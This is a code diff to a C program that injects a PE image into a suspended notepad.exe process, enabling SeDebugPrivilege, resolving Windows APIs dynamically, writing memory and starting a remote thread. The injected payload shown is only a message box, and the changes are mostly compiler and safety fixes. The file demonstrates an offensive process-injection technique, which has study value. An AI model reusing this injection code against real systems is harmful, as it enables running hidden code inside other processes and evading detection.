@@ -5,7 +5,7 @@ Code injects a message box PE into a remote process (notepad.exe) and run with p
 All Win APIs called dynamically. 
 Author: thomas-meng@outlook.com
 Code reference: 
-tributes to Mantvydas Baranauskas who implemented the prototype PE injection technique
+tributes to Mantvydas Baranauskas implemented the prototype PE injection technique
 ired.team:
 https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes
 */
@@ -14,15 +14,15 @@ https://www.ired.team/offensive-security/code-injection-process-injection/pe-inj
 #include <windows.h>
 
 typedef struct BASE_RELOCATION_ENTRY {
-	USHORT Offset : 12; //The bottom 12bits are used to describe the offset into the VirtualAddress of the containing relocation block.
-	USHORT Type : 4;
-} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
+    USHORT Offset : 12; //The bottom 12bits are used to describe the offset bytes relative to the image base
+    USHORT Type : 4; // 4 bits for relocation type
+} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
 
-BOOL EnableWindowsPrivilege(TCHAR* Privilege) {
+BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
     HANDLE token;
     TOKEN_PRIVILEGES priv;
     BOOL ret = FALSE;
-    printf(" [+] Enable %s privilege\n", Privilege);
+    wprintf(L" [+] Enable %ls adequate privilege\n", Privilege);
 
     if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
         priv.PrivilegeCount = 1;
@@ -41,12 +41,13 @@ BOOL EnableWindowsPrivilege(TCHAR* Privilege) {
     }
 
     if (ret == TRUE)
-        printf(" [+] Success\n");
+        wprintf(L" [+] Success\n");
     else
-        printf(" [-] Failure\n");
+        wprintf(L" [-] Failure\n");
 
     return ret;
 }
+
 
 // Define function pointers for dynamically loaded functions
 typedef HANDLE(WINAPI *PFN_GETMODULEHANDLEA)(LPCSTR);
@@ -62,7 +63,7 @@ typedef HANDLE(WINAPI *PFN_OPENPROCESS)(DWORD, BOOL, DWORD);
 typedef int(WINAPI *PFN_MESSAGEBOXA)(HWND, LPCSTR, LPCSTR, UINT);
 
 BOOL IsSystem64Bit() {
-    HMODULE hKernel32 = LoadLibrary("kernel32.dll");
+    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
     if (!hKernel32) return FALSE;
 
     PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
@@ -84,7 +85,7 @@ BOOL IsSystem64Bit() {
 
 
 DWORD InjectionEntryPoint() {
-    HMODULE hUser32 = LoadLibrary("user32.dll");
+    HMODULE hUser32 = LoadLibraryA("user32.dll");
     if (!hUser32) return 0;
 
     PFN_MESSAGEBOXA pMessageBoxA = (PFN_MESSAGEBOXA)GetProcAddress(hUser32, "MessageBoxA");
@@ -98,7 +99,7 @@ DWORD InjectionEntryPoint() {
 
 int main()
 {
-    HMODULE hKernel32 = LoadLibrary("kernel32.dll");
+    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
     if (!hKernel32) {
         printf("Failed to load kernel32.dll.\n");
         return -1;
@@ -114,7 +115,6 @@ int main()
     PFN_WRITEPROCESSMEMORY pWriteProcessMemory = (PFN_WRITEPROCESSMEMORY)GetProcAddress(hKernel32, "WriteProcessMemory");
     PFN_CREATEREMOTETHREAD pCreateRemoteThread = (PFN_CREATEREMOTETHREAD)GetProcAddress(hKernel32, "CreateRemoteThread");
 
-
     if (!EnableWindowsPrivilege(TEXT("SeDebugPrivilege"))) {
         printf("Failed to enable SeDebugPrivilege. You might not have sufficient rights.\n");
         return -1;
@@ -129,10 +129,11 @@ int main()
     // Use relevant notepad based on sys arch. 
     char notepadPath[256];
     if (IsSystem64Bit()) {
-        strcpy(notepadPath, "C:\\Windows\\System32\\notepad.exe");
+        strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
     } else {
-        strcpy(notepadPath, "C:\\Windows\\SysWOW64\\notepad.exe");
+        strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
     }
+
 
     // Launch Notepad in suspended state
     PROCESS_INFORMATION pi;
@@ -151,10 +152,10 @@ int main()
 	if (imageBase != NULL)
 	{
 	    char path[MAX_PATH];
-	    if (GetModuleFileName(imageBase, path, sizeof(path)) != 0)
+        if (GetModuleFileNameA((HMODULE)imageBase, path, sizeof(path)) != 0)
 	    {
-	        // The path variable now contains the full path to the executable.
-	        printf("This program is running from: %s\n", path);
+            printf("This program is running from: %s\n", path);
+
 	    }
 	}
 	
@@ -174,7 +175,7 @@ int main()
 
 	// Iterate the reloc table of the local image and modify all absolute addresses to work at the address returned by VirtualAllocEx.
 	// Loop for all relocation descriptors in all relocation blocks
-    while (totalProcessed < totalSize) {
+    while (totalProcessed < (DWORD)totalSize) { // Fixed the signed/unsigned mismatch warning
         DWORD blockSize = relocationTable->SizeOfBlock;
         DWORD entryCount = (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
         PBASE_RELOCATION_ENTRY entries = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
